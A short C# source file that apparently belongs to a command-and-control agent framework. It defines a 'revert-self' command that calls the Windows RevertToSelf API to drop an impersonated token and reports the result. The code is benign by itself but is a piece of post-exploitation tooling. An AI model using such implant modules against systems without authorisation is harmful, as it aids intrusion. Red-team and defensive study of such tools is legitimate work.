using Agent.Commands;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Commands
{
    public class RevertToSelfCommand : AgentCommand
    {
        public override string Name => "revert-self";
        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, MessageManager commm)
        {
         
            if (Agent.Native.Advapi.RevertToSelf())
            {
                result.Result += $"Reverted to self";
                return;
            }

            result.Result += $"Failed to revert";
            return;
        }
    }
}
